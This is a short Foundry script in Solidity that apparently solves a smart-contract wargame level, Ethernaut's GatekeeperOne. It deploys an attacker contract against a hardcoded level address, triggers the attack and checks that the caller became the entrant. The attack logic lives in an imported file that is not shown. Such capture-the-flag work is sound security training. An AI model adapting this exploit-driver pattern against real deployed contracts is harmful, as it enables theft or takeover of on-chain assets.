// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/13-GatekeeperOne.sol";
import "../src/13-GatekeeperOne.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    GatekeeperOne gatekeeperOne = GatekeeperOne(0x6a808f69482016d7037fb2dc92d0C22cE4817f10);

    function run() external{
        vm.startBroadcast();

        // Create GatekeeperOneAttacker
        GatekeeperOneAttacker attacker = new GatekeeperOneAttacker(0x6a808f69482016d7037fb2dc92d0C22cE4817f10);
        
        // Attack gatekeeper
        attacker.attack();

        assert(gatekeeperOne.entrant() == msg.sender);

        vm.stopBroadcast();
    }
}